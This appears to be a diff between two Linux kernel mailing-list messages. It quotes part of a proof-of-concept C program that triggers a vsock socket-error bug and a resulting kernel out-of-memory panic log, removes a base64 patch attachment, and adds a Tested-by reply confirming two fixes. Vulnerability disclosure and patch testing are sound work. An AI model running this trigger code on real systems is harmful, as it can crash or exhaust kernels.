+> >       if (fd < 0)
+> >               die("listener socket(AF_VSOCK)");
+> >
+> >       set_connect_timeout(fd, 1);
+> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, buffer_size);
+> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, buffer_size);
+> >       bind_vsock(fd, VMADDR_CID_LOCAL, server_port);
+> >
+> >       err =3D connect_vsock_errno(fd, VMADDR_CID_LOCAL, fail_port);
+> >       if (err =3D=3D 0) {
+> >               fprintf(stderr, "unexpected successful failed-connect set=
+up on port %u\n",
+> >                       fail_port);
+> >               exit(EXIT_FAILURE);
+> >       }
+> >
+> >       fprintf(stderr, "[*] setup connect() failed with errno=3D%d (%s)\=
+n",
+> >               err, strerror(err));
+> >
+> >       if (listen(fd, 1) < 0)
+> >               die("listen(AF_VSOCK)");
+> >
+> >       return fd;
+> >}
+> >
+> >static int trigger_once(unsigned int server_port, unsigned int fail_port=
+,
+> >                       unsigned int client_port,
+> >                       unsigned long long buffer_size,
+> >                       unsigned long long send_bytes)
+> >{
+> >       struct client_ctx ctx;
+> >       pthread_t tid;
+> >       int listener_fd;
+> >       int accept_fd;
+> >       int accept_errno;
+> >
+> >       listener_fd =3D prepare_listener(server_port, fail_port, buffer_s=
+ize);
+> >
+> >       client_ctx_init(&ctx, server_port, client_port, send_bytes);
+> >       if (pthread_create(&tid, NULL, client_thread, &ctx) !=3D 0)
+> >               die("pthread_create");
+> >
+> >       if (wait_for_connect(&ctx) !=3D 0) {
+> >               fprintf(stderr, "client connect failed with errno=3D%d (%=
+s)\n",
+> >                       ctx.connect_errno, strerror(ctx.connect_errno));
+> >               exit(EXIT_FAILURE);
+> >       }
+> >
+> >       wait_for_send_progress(&ctx);
+> >
+> >       accept_fd =3D accept(listener_fd, NULL, NULL);
+> >       accept_errno =3D errno;
+> >
+> >       fprintf(stderr, "[*] accept() returned fd=3D%d errno=3D%d (%s)\n"=
+,
+> >               accept_fd, accept_errno, strerror(accept_errno));
+> >
+> >       if (accept_fd >=3D 0) {
+> >               fprintf(stderr, "unexpected successful accept()\n");
+> >               exit(EXIT_FAILURE);
+> >       }
+> >
+> >       if (accept_errno !=3D ECONNRESET) {
+> >               fprintf(stderr, "unexpected accept errno: %d (%s)\n",
+> >                       accept_errno, strerror(accept_errno));
+> >               exit(EXIT_FAILURE);
+> >       }
+> >
+> >       close(listener_fd);
+> >
+> >       pthread_join(tid, NULL);
+> >
+> >       fprintf(stderr,
+> >               "[*] client connect errno=3D%d send errno=3D%d bytes_sent=
+=3D%llu sent_any=3D%d done=3D%d\n",
+> >               ctx.connect_errno, ctx.send_errno, ctx.bytes_sent,
+> >               ctx.sent_any, ctx.done);
+> >       accept_fd =3D ctx.fd;
+> >       ctx.fd =3D -1;
+> >       client_ctx_destroy(&ctx);
+> >       return accept_fd;
+> >}
+> >
+> >static unsigned int parse_u32(const char *s)
+> >{
+> >       unsigned long long v =3D strtoull(s, NULL, 0);
+> >
+> >       if (v > UINT32_MAX) {
+> >               fprintf(stderr, "value too large: %s\n", s);
+> >               exit(EXIT_FAILURE);
+> >       }
+> >
+> >       return (unsigned int)v;
+> >}
+> >
+> >static unsigned long long parse_u64(const char *s)
+> >{
+> >       return strtoull(s, NULL, 0);
+> >}
+> >
+> >int main(int argc, char **argv)
+> >{
+> >       unsigned int iterations =3D DEFAULT_ITERATIONS;
+> >       unsigned int base_port =3D DEFAULT_BASE_PORT;
+> >       unsigned int fail_base =3D DEFAULT_FAIL_PORT;
+> >       unsigned long long buffer_size =3D DEFAULT_BUFFER_SIZE;
+> >       unsigned long long send_bytes =3D DEFAULT_SEND_BYTES;
+> >       unsigned int hold_seconds =3D 0;
+> >       int *held_fds;
+> >       unsigned int i;
+> >
+> >       signal(SIGPIPE, SIG_IGN);
+> >
+> >       if (argc > 1)
+> >               iterations =3D parse_u32(argv[1]);
+> >       if (argc > 2)
+> >               base_port =3D parse_u32(argv[2]);
+> >       if (argc > 3)
+> >               fail_base =3D parse_u32(argv[3]);
+> >       if (argc > 4)
+> >               buffer_size =3D parse_u64(argv[4]);
+> >       if (argc > 5)
+> >               send_bytes =3D parse_u64(argv[5]);
+> >       if (argc > 6)
+> >               hold_seconds =3D parse_u32(argv[6]);
+> >
+> >       held_fds =3D calloc(iterations, sizeof(*held_fds));
+> >       if (!held_fds)
+> >               die("calloc");
+> >
+> >       for (i =3D 0; i < iterations; i++)
+> >               held_fds[i] =3D -1;
+> >
+> >       fprintf(stderr,
+> >               "[*] iterations=3D%u base_port=3D%u fail_base=3D%u buffer=
+_size=3D%llu send_bytes=3D%llu hold_seconds=3D%u\n",
+> >               iterations, base_port, fail_base, buffer_size, send_bytes=
+,
+> >               hold_seconds);
+> >
+> >       for (i =3D 0; i < iterations; i++) {
+> >               unsigned int server_port =3D base_port + (i * 2);
+> >               unsigned int client_port =3D base_port + (i * 2) + 1;
+> >               unsigned int fail_port =3D fail_base + i;
+> >
+> >               fprintf(stderr,
+> >                       "[*] iteration=3D%u server_port=3D%u client_port=
+=3D%u fail_port=3D%u\n",
+> >                       i, server_port, client_port, fail_port);
+> >               held_fds[i] =3D trigger_once(server_port, fail_port, clie=
+nt_port,
+> >                                          buffer_size, send_bytes);
+> >               fprintf(stderr, "[*] holding client fd=3D%d\n", held_fds[=
+i]);
+> >       }
+> >
+> >       if (hold_seconds) {
+> >               fprintf(stderr, "[*] sleeping for %u seconds with client =
+sockets open\n",
+> >                       hold_seconds);
+> >               sleep(hold_seconds);
+> >       }
+> >
+> >       for (i =3D 0; i < iterations; i++) {
+> >               if (held_fds[i] >=3D 0)
+> >                       close(held_fds[i]);
+> >       }
+> >
+> >       free(held_fds);
+> >
+> >       return 0;
+> >}
+> >
+> >------END poc.c--------
+> >
+> >----BEGIN crash log----
+> >
+> >[  921.941962][T10458] Kernel panic - not syncing: Out of memory: compul=
+sory panic_on_oom is enabled
+> >[  921.942839][T10458] CPU: 0 UID: 0 PID: 10458 Comm: poc Not tainted 6.=
+12.74 #3
+> >[  921.943455][T10458] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PII=
+X, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+> >[  921.944405][T10458] Call Trace:
+> >[  921.944701][T10458]  <TASK>
+> >[  921.944974][T10458]  dump_stack_lvl+0x3b/0x1f0
+> >[  921.945423][T10458]  panic+0x6fe/0x7e0
+> >[  921.945802][T10458]  ? dump_header+0x6c2/0x950
+> >[  921.946233][T10458]  ? __pfx_panic+0x10/0x10
+> >[  921.947686][T10458]  ? out_of_memory+0x8c5/0x16b0
+> >[  921.948137][T10458]  out_of_memory+0x8f3/0x16b0
+> >[  921.949926][T10458]  __alloc_pages_noprof+0x1ec3/0x26d0
+> >[  921.954378][T10458]  alloc_pages_mpol_noprof+0x2ce/0x610
+> >[  921.956796][T10458]  folio_alloc_noprof+0x23/0xd0
+> >[  921.957720][T10458]  filemap_alloc_folio_noprof+0x35d/0x420
+> >[  921.959719][T10458]  filemap_fault+0x675/0x2800
+> >[  921.962920][T10458]  do_pte_missing+0x174c/0x3ff0
+> >[  921.964830][T10458]  __handle_mm_fault+0xfa3/0x2a10
+> >[  921.967730][T10458]  handle_mm_fault+0x3f5/0xa00
+> >[  921.968200][T10458]  do_user_addr_fault+0x50a/0x1490
+> >[  921.968691][T10458]  exc_page_fault+0x5d/0xe0
+> >[  921.969113][T10458]  asm_exc_page_fault+0x26/0x30
+> >[  921.969561][T10458] RIP: 0033:0x7f47a09b2237
+> >[  921.969990][T10458] Code: Unable to access opcode bytes at 0x7f47a09b=
+220d.
+> >[  921.970550][T10458] RSP: 002b:00007f47a089be60 EFLAGS: 00010202
+> >[  921.971073][T10458] RAX: 0000000000010000 RBX: 00007ffe78934c80 RCX: =
+00007f47a0942c8e
+> >[  921.972372][T10458] RDX: 000000000000002c RSI: 0000000000000000 RDI: =
+0000000000000016
+> >[  921.973017][T10458] RBP: 0000000001800000 R08: 0000000000000000 R09: =
+0000000000000000
+> >[  921.974428][T10458]  </TASK>
+> >[  921.974959][T10458] Kernel Offset: disabled
+> >[  921.975445][T10458] Rebooting in 86400 seconds..
+> >
+> >-----END crash log-----
+> >
+> >Best regards,
+> >Zihan Xi
+> >
+> >Zihan Xi (1):
+> >  vsock: clear stale sk_err before listen()
+> >
+> > net/vmw_vsock/af_vsock.c | 4 ++++
+> > 1 file changed, 4 insertions(+)
+> >
+> >--
+> >2.43.0
+> >
 >
 
---000000000000fb3b0b0657ab9857
-Content-Type: application/octet-stream; name=patch-paolo-mod
-Content-Disposition: attachment; filename=patch-paolo-mod
-Content-Transfer-Encoding: base64
-Content-ID: <f_ms4odzmu0>
-X-Attachment-Id: f_ms4odzmu0
+Hi Stefano, Phi,
 
-ZGlmZiAtLWdpdCBhL25ldC9zY2hlZC9jbHNfcm91dGUuYyBiL25ldC9zY2hlZC9jbHNfcm91dGUu
-YwppbmRleCBiZDZmOTQ1YmQzODguLmM2OGFjOThmMjA0NyAxMDA2NDQKLS0tIGEvbmV0L3NjaGVk
-L2Nsc19yb3V0ZS5jCisrKyBiL25ldC9zY2hlZC9jbHNfcm91dGUuYwpAQCAtNTIsNiArNTIsNyBA
-QCBzdHJ1Y3Qgcm91dGU0X2ZpbHRlciB7CiAJc3RydWN0IHRjZl9yZXN1bHQJcmVzOwogCXN0cnVj
-dCB0Y2ZfZXh0cwkJZXh0czsKIAl1MzIJCQloYW5kbGU7CisJYm9vbAkJCWR5aW5nOwogCXN0cnVj
-dCByb3V0ZTRfYnVja2V0CSpia3Q7CiAJc3RydWN0IHRjZl9wcm90bwkqdHA7CiAJc3RydWN0IHJj
-dV93b3JrCQlyd29yazsKQEAgLTY2LDkgKzY3LDExIEBAIHN0YXRpYyBpbmxpbmUgaW50IHJvdXRl
-NF9mYXN0bWFwX2hhc2godTMyIGlkLCBpbnQgaWlmKQogCiBzdGF0aWMgREVGSU5FX1NQSU5MT0NL
-KGZhc3RtYXBfbG9jayk7CiBzdGF0aWMgdm9pZAotcm91dGU0X3Jlc2V0X2Zhc3RtYXAoc3RydWN0
-IHJvdXRlNF9oZWFkICpoZWFkKQorcm91dGU0X3Jlc2V0X2Zhc3RtYXAoc3RydWN0IHJvdXRlNF9o
-ZWFkICpoZWFkLCBzdHJ1Y3Qgcm91dGU0X2ZpbHRlciAqZikKIHsKIAlzcGluX2xvY2tfYmgoJmZh
-c3RtYXBfbG9jayk7CisJaWYgKGYpCisJCWYtPmR5aW5nID0gdHJ1ZTsKIAltZW1zZXQoaGVhZC0+
-ZmFzdG1hcCwgMCwgc2l6ZW9mKGhlYWQtPmZhc3RtYXApKTsKIAlzcGluX3VubG9ja19iaCgmZmFz
-dG1hcF9sb2NrKTsKIH0KQEAgLTgxLDkgKzg0LDExIEBAIHJvdXRlNF9zZXRfZmFzdG1hcChzdHJ1
-Y3Qgcm91dGU0X2hlYWQgKmhlYWQsIHUzMiBpZCwgaW50IGlpZiwKIAogCS8qIGZhc3RtYXAgdXBk
-YXRlcyBtdXN0IGxvb2sgYXRvbWljIHRvIGFsaW5nIGlkLCBpZmYsIGZpbHRlciAqLwogCXNwaW5f
-bG9ja19iaCgmZmFzdG1hcF9sb2NrKTsKLQloZWFkLT5mYXN0bWFwW2hdLmlkID0gaWQ7Ci0JaGVh
-ZC0+ZmFzdG1hcFtoXS5paWYgPSBpaWY7Ci0JaGVhZC0+ZmFzdG1hcFtoXS5maWx0ZXIgPSBmOwor
-CWlmIChmID09IFJPVVRFNF9GQUlMVVJFIHx8ICFmLT5keWluZykgeworCQloZWFkLT5mYXN0bWFw
-W2hdLmlkID0gaWQ7CisJCWhlYWQtPmZhc3RtYXBbaF0uaWlmID0gaWlmOworCQloZWFkLT5mYXN0
-bWFwW2hdLmZpbHRlciA9IGY7CisJfQogCXNwaW5fdW5sb2NrX2JoKCZmYXN0bWFwX2xvY2spOwog
-fQogCkBAIC0yOTcsNiArMzAyLDEzIEBAIHN0YXRpYyB2b2lkIHJvdXRlNF9kZXN0cm95KHN0cnVj
-dCB0Y2ZfcHJvdG8gKnRwLCBib29sIHJ0bmxfaGVsZCwKIAkJCQkJbmV4dCA9IHJ0bmxfZGVyZWZl
-cmVuY2UoZi0+bmV4dCk7CiAJCQkJCVJDVV9JTklUX1BPSU5URVIoYi0+aHRbaDJdLCBuZXh0KTsK
-IAkJCQkJdGNmX3VuYmluZF9maWx0ZXIodHAsICZmLT5yZXMpOworCQkJCQkvKiBNYXJrIHRoZSBm
-aWx0ZXIgZHlpbmcgdW5kZXIgZmFzdG1hcF9sb2NrIHNvCisJCQkJCSAqIGFueSBpbi1mbGlnaHQg
-cmVhZGVyIHRoYXQgc3RpbGwgaG9sZHMgaXQKKwkJCQkJICogd2lsbCBza2lwIHRoZSByZXB1Ymxp
-c2ggaW4gcm91dGU0X3NldF9mYXN0bWFwKCkuCisJCQkJCSAqLworCQkJCQlzcGluX2xvY2tfYmgo
-JmZhc3RtYXBfbG9jayk7CisJCQkJCWYtPmR5aW5nID0gdHJ1ZTsKKwkJCQkJc3Bpbl91bmxvY2tf
-YmgoJmZhc3RtYXBfbG9jayk7CiAJCQkJCWlmICh0Y2ZfZXh0c19nZXRfbmV0KCZmLT5leHRzKSkK
-IAkJCQkJCXJvdXRlNF9xdWV1ZV93b3JrKGYpOwogCQkJCQllbHNlCkBAIC0zMDcsNiArMzE5LDE2
-IEBAIHN0YXRpYyB2b2lkIHJvdXRlNF9kZXN0cm95KHN0cnVjdCB0Y2ZfcHJvdG8gKnRwLCBib29s
-IHJ0bmxfaGVsZCwKIAkJCWtmcmVlX3JjdShiLCByY3UpOwogCQl9CiAJfQorCisJLyogQWxsIGZp
-bHRlcnMgYXJlIHVubGlua2VkIGFuZCBtYXJrZWQgZHlpbmcsIHNvIG5vIGluLWZsaWdodAorCSAq
-IHJlYWRlciBjYW4gcmVwdWJsaXNoIGEgc3RhbGUgZW50cnkgYWZ0ZXIgdGhpcyByZXNldC4KKwkg
-Ki8KKwlyb3V0ZTRfcmVzZXRfZmFzdG1hcChoZWFkLCBOVUxMKTsKIAlrZnJlZV9yY3UoaGVhZCwg
-cmN1KTsKIH0KIApAQCAtMzM4LDcgKzM2MCw3IEBAIHN0YXRpYyBpbnQgcm91dGU0X2RlbGV0ZShz
-dHJ1Y3QgdGNmX3Byb3RvICp0cCwgdm9pZCAqYXJnLCBib29sICpsYXN0LAogCQkJICogbm90aWNl
-IHdlIHVubGluaydkIHRoZSBmaWx0ZXIgc28gd2UgY2FuJ3QgZ2V0IGl0CiAJCQkgKiBiYWNrIGlu
-IHRoZSBmYXN0bWFwLgogCQkJICovCi0JCQlyb3V0ZTRfcmVzZXRfZmFzdG1hcChoZWFkKTsKKwkJ
-CXJvdXRlNF9yZXNldF9mYXN0bWFwKGhlYWQsIGYpOwogCiAJCQkvKiBEZWxldGUgaXQgKi8KIAkJ
-CXRjZl91bmJpbmRfZmlsdGVyKHRwLCAmZi0+cmVzKTsKQEAgLTU1OCw3ICs1ODAsNyBAQCBzdGF0
-aWMgaW50IHJvdXRlNF9jaGFuZ2Uoc3RydWN0IG5ldCAqbmV0LCBzdHJ1Y3Qgc2tfYnVmZiAqaW5f
-c2tiLAogCQl9CiAJfQogCi0Jcm91dGU0X3Jlc2V0X2Zhc3RtYXAoaGVhZCk7CisJcm91dGU0X3Jl
-c2V0X2Zhc3RtYXAoaGVhZCwgZm9sZCk7CiAJKmFyZyA9IGY7CiAJaWYgKGZvbGQpIHsKIAkJdGNm
-X3VuYmluZF9maWx0ZXIodHAsICZmb2xkLT5yZXMpOwo=
---000000000000fb3b0b0657ab9857--
+I tested both patches below with my reproducer:
+
+  [PATCH] vsock: use sock_error() to consume sk_err after connect timeout
+  Message-ID: <20260719220103.684489-1-phind.uet@gmail.com>
+
+  [PATCH v2] vsock: use sock_error() to consume sk_err after ...
+  Message-ID: <20260727071305.45826-1-phind.uet@gmail.com>
+
+Both fix the issue for me.
+
+Tested-by: Zihan Xi <zihanx@nebusec.ai>
+
+Best regards,
+Zihan Xi
